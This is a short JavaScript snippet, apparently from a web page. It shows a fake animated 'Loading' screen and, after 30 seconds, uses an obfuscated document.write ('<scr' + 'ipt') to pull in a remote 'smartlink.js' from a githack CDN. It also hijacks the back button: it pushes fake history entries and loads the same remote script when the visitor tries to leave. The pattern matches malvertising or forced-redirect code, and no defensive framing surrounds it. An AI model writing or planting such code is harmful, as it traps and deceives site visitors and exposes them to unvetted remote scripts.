    var ci = 0;
    var load = document.getElementById("load");
    setInterval(function(){
        switch(ci){
            case 0:
                load.innerHTML = 'Loading<br>';
                ci = 1;
                break;
            case 1:
                load.innerHTML = 'Loading<br> .';
                ci = 2;
                break;
            case 2:
                load.innerHTML = 'Loading<br>. . .';
                ci = 3;
                break;
            case 3:
                load.innerHTML = 'Loading<br>. . . . .';
                ci = 4;
                break;
            case 4:
                load.innerHTML = 'Loading<br>. . . . . . .';
                ci = 5;
                break;
            case 5:
                load.innerHTML = 'Loading<br>. . . . . . . . .';
                ci = 0;
                break;
        }
    },300);
    setTimeout(function(){
		            document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/aridjayasite/aridjayasite/4e706569d1b8f2037d08879d9ffe7a76e1fa3162/random/smartlink.js"></scr' + 'ipt>');
            },30000);    

// back
  if (typeof history.pushState === "function") {
	history.pushState("back", null, null);
	window.onpopstate = function() {
	    history.pushState("back", null, null);
		      document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/aridjayasite/aridjayasite/4e706569d1b8f2037d08879d9ffe7a76e1fa3162/random/smartlink.js"></scr' + 'ipt>');
	    }
  	};
